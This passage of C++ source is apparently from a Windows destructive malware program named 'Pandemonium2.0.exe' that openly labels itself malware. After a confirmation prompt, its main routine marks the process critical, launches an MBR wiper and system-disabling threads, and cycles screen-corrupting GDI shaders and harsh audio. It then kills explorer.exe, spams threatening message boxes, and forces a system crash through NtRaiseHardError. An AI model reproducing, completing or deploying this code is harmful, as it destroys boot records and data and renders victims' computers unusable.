		// Create a GRADIENT_TRIANGLE structure that references the TRIVERTEX vertices.
		GRADIENT_TRIANGLE gTriangle;
		gTriangle.Vertex1 = 0;
		gTriangle.Vertex2 = 1;
		gTriangle.Vertex3 = 2;

		// Draw a shaded triangle.
		GradientFill(hdc, vertex, 3, &gTriangle, 1, GRADIENT_FILL_TRIANGLE);
		ReleaseDC(0, hdc);
		Sleep(1);
	}

	return 0x00;
}


DWORD WINAPI shader7(LPVOID lpvd) //grayscale
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;

				// Copy the current pixel color
				rgbquadCopy = rgbquad[index];

				// Convert RGB to HSL
				hslcolor = Colors::rgb2hsl(rgbquadCopy);

				// Set saturation to 0 to make it grayscale
				hslcolor.s = 0.0f;

				// Convert back to RGB
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}

DWORD WINAPI blur3(LPVOID lpvd)
{
	//Credits to ArTicZera and Rekto
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	RECT rekt;
	POINT wPt[3];
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);

	BITMAPINFO bmpi = { 0 };
	BLENDFUNCTION blur;
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	bmp = CreateDIBSection(hdc, &bmpi, 0, 0, NULL, 0);
	SelectObject(hdcCopy, bmp);

	blur.BlendOp = AC_SRC_OVER;
	blur.BlendFlags = 0;
	blur.AlphaFormat = 0;
	blur.SourceConstantAlpha = 10;

	while (1) {
		hdc = GetDC(NULL);
		//StretchBlt(hdcCopy, 0, 10, w, h + 20, hdc, 0, 0, w, h, SRCERASE);
		GetWindowRect(GetDesktopWindow(), &rekt);
		wPt[0].x = rekt.left - 10;
		wPt[0].y = rekt.top - 10;
		wPt[1].x = rekt.right + 10;
		wPt[1].y = rekt.top;
		wPt[2].x = rekt.left - 10;
		wPt[2].y = rekt.bottom + 10;
		PlgBlt(hdcCopy, wPt, hdc, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, 0, 0, 0);
		AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blur);
		//Sleep(rand() % 25);
		ReleaseDC(0, hdc);
	}
	return 0x00;
}

VOID WINAPI sound1() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 4000, 4000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[4000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t*(t^t >> 6));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound2() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t - t*(t&t >> 5));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound3() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11000, 11000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t + t*(t >> 6)*(t >> 9));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound4() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11000, 11000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t^t >> 9)*(t >> 7);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound5() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22000, 22000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[22000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t*t*(t&t >> 6));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound6() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22000, 22000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[22000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t*t ^ (t&t >> 6));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound7() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11000, 11000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t*t ^ (t*t >> 5)&(t >> 4));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound8() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11000, 11000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t*t >> 1 * (t >> 7)*(t >> 8) - (t >> t));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
//t>>((t^t>>6))
VOID WINAPI sound9() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 60] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t >> ((t&t >> 6)));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound10() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t >> ((t^t >> 6)));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI final() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 4000, 4000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[4000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * rand());

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

DWORD WINAPI msg(LPVOID lpParam) {
	MessageBox(NULL, L"GOODBYE TO YOUR PC!", L"Pandemonium2.0.exe", MB_OK | MB_ICONERROR);
	return 0;
}

DWORD WINAPI msg2(LPVOID lpParam) {
	MessageBox(NULL, L"WE BOTH DIE TONIGHT!!!", L"Pandemonium2.0.exe", MB_OK | MB_ICONERROR);
	return 0;
}

DWORD WINAPI MsgSpamThread(LPVOID lpParam) {
	while (1) {
		CreateThread(0, 0, msg, 0, 0, 0);
		Sleep(rand() % 500);
		CreateThread(0, 0, msg2, 0, 0, 0);
		Sleep(rand() % 500);
	}
	return 0;
}
//t*(t^t>>5 * t&t>>5)%(t>>6)
int CALLBACK WinMain(
	HINSTANCE hInstance, HINSTANCE hPrevInstance,
	LPSTR     lpCmdLine, int       nCmdShow
)
{
	if (MessageBoxW(NULL, L"Run Malware?", L"Pandemonium2.0.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		if (MessageBoxW(NULL, L"Are you sure? You'll Erasing your computer with this malware.", L"Pandemonium2.0.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
		{
			ExitProcess(0);
		}
		else
		{
			ProcessIsCritical();
			CreateThread(0, 0, MBRWiper, 0, 0, 0);
			//CreateThread(0, 0, theerror, 0, 0, 0);
			CreateThread(0, 0, Disabler, 0, 0, 0);
			Sleep(1000);
			CreateThread(0, 0, notaskbar, 0, 0, 0);
			CreateThread(0, 0, Time, 0, 0, 0);
			CreateThread(0, 0, Click, 0, 0, 0);
			CreateThread(0, 0, Programs, 0, 0, 0);
			CreateThread(0, 0, Buttons, 0, 0, 0);
			Sleep(7000);
			CreateThread(0, 0, mouse, 0, 0, 0);
			HANDLE thread0 = CreateThread(0, 0, textz, 0, 0, 0);
			HANDLE Motherfaka = CreateThread(0, 0, window, 0, 0, 0);
			HANDLE thread1 = CreateThread(0, 0, shader1, 0, 0, 0);
			sound1();
			Sleep(30000);
			TerminateThread(thread1, 0);
			CloseHandle(thread1);
			HANDLE thread2 = CreateThread(0, 0, shader2, 0, 0, 0);
			sound2();
			Sleep(30000);
			TerminateThread(thread2, 0);
			CloseHandle(thread2);
			HANDLE thread3 = CreateThread(0, 0, shader3, 0, 0, 0);
			sound3();
			Sleep(30000);
			TerminateThread(thread3, 0);
			CloseHandle(thread3);
			HANDLE thread4 = CreateThread(0, 0, plgblt, 0, 0, 0);
			sound4();
			Sleep(30000);
			TerminateThread(thread4, 0);
			CloseHandle(thread4);
			HANDLE thread5 = CreateThread(0, 0, shader4, 0, 0, 0);
			sound5();
			Sleep(30000);
			TerminateThread(thread5, 0);
			CloseHandle(thread5);
			HANDLE thread6 = CreateThread(0, 0, shader5, 0, 0, 0);
			sound6();
			Sleep(30000);
			TerminateThread(thread6, 0);
			CloseHandle(thread6);
			HANDLE thread7 = CreateThread(0, 0, shader6, 0, 0, 0);
			sound7();
			Sleep(30000);
			TerminateThread(thread7, 0);
			CloseHandle(thread7);
			HANDLE thread8 = CreateThread(0, 0, sines1, 0, 0, 0);
			//HANDLE thread8dot1 = CreateThread(0, 0, cube, 0, 0, 0);
			sound8();
			Sleep(30000);
			TerminateThread(thread8, 0);
			CloseHandle(thread8);
			HANDLE thread9 = CreateThread(0, 0, pixelate, 0, 0, 0);
			HANDLE thread9dot1 = CreateThread(0, 0, gradientfilltriangle, 0, 0, 0);
			sound9();
			Sleep(30000);
			TerminateThread(thread9, 0);
			CloseHandle(thread9);
			HANDLE thread10 = CreateThread(0, 0, shader7, 0, 0, 0);
			CreateThread(0, 0, Programs, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread10, 0);
			CloseHandle(thread10);
			HANDLE thread11 = CreateThread(0, 0, sines1, 0, 0, 0);
			sound10();
			Sleep(30000);
			TerminateThread(thread11, 0);
			CloseHandle(thread11);
			final();
			HANDLE thread12 = CreateThread(0, 0, shader1, 0, 0, 0);
			HANDLE thread13 = CreateThread(0, 0, shader2, 0, 0, 0);
			HANDLE thread14 = CreateThread(0, 0, shader3, 0, 0, 0);
			HANDLE thread15 = CreateThread(0, 0, shader4, 0, 0, 0);
			HANDLE thread16 = CreateThread(0, 0, shader5, 0, 0, 0);
			HANDLE thread17 = CreateThread(0, 0, shader6, 0, 0, 0);
			HANDLE thread18 = CreateThread(0, 0, shader7, 0, 0, 0);
			HANDLE thread19 = CreateThread(0, 0, plgblt, 0, 0, 0);
			HANDLE thread20 = CreateThread(0, 0, pixelate, 0, 0, 0);
			HANDLE thread21 = CreateThread(0, 0, gradientfilltriangle, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread12, 0);
			TerminateThread(thread13, 0);
			TerminateThread(thread14, 0);
			TerminateThread(thread15, 0);
			TerminateThread(thread16, 0);
			TerminateThread(thread17, 0);
			TerminateThread(thread18, 0);
			TerminateThread(thread19, 0);
			TerminateThread(thread20, 0);
			TerminateThread(thread21, 0);
			CloseHandle(thread12);
			CloseHandle(thread13);
			CloseHandle(thread14);
			CloseHandle(thread15);
			CloseHandle(thread16);
			CloseHandle(thread17);
			CloseHandle(thread18);
			CloseHandle(thread19);
			CloseHandle(thread20);
			CloseHandle(thread21);
			TerminateThread(thread9dot1, 0);
			CloseHandle(thread9dot1);
			TerminateThread(Motherfaka, 0);
			CloseHandle(Motherfaka);
			system("Taskkill /f /im explorer.exe");
			HANDLE systemsdeath = CreateThread(0, 0, MsgSpamThread, 0, 0, 0);
			HANDLE Moveevent = CreateThread(0, 0, window2, 0, 0, 0);
			Sleep(30000);
			BOOLEAN bl;
			DWORD response;
			NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
			RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
			RtlAdjustPrivilege(19, 1, 0, &bl);
			NtRaiseHardError(0xC000006C, 0, 0, 0, 6, &response);
			Sleep(-1);
		}
	}
}